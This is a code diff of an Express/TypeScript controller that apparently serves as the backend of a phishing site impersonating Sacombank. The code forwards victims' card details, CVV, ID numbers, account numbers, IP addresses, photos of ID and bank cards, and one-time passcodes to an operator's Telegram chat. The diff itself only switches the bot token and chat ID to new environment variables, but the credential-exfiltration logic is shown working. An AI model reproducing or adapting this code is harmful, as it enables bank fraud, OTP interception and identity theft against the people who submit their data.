@@ -1,11 +1,12 @@
 import { Request, Response } from "express";
-import { Sacombank } from "../models/sacombank.model"
+import { Sacombank } from "../models/sacombank.model";
 import { getUrlUpload } from "../helper";
 const TelegramBot = require("node-telegram-bot-api");
 import dotenv from "dotenv";
 dotenv.config();
 
-const TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
+const TOKEN = process.env.TELEGRAM_BOT_TOKEN_2 || "";
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID_2 || "";
 const bot = new TelegramBot(TOKEN, { polling: false });
 
 export class SacombankController {
@@ -73,13 +74,13 @@ export class SacombankController {
 
       await Promise.allSettled([
         bot.sendMessage(
-          process.env.TELEGRAM_CHAT_ID,
+          CHAT_ID,
           `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}\n`
         ),
-        frontIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontIdCard),
-        backIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backIdCard),
-        frontCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontCard),
-        backCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backCard),
+        frontIdCard && bot.sendPhoto(CHAT_ID, frontIdCard),
+        backIdCard && bot.sendPhoto(CHAT_ID, backIdCard),
+        frontCard && bot.sendPhoto(CHAT_ID, frontCard),
+        backCard && bot.sendPhoto(CHAT_ID, backCard),
       ]).catch((err) => {
         console.log("err", err.message);
       });
@@ -138,10 +139,7 @@ export class SacombankController {
       io.emit("updateOTP", result);
 
       bot
-        .sendMessage(
-          process.env.TELEGRAM_CHAT_ID,
-          `OTP: ${otp}\nName: ${result?.name}`
-        )
+        .sendMessage(CHAT_ID, `OTP: ${otp}\nName: ${result?.name}`)
         .catch((err: any) => {
           console.log("err", err.message);
         });
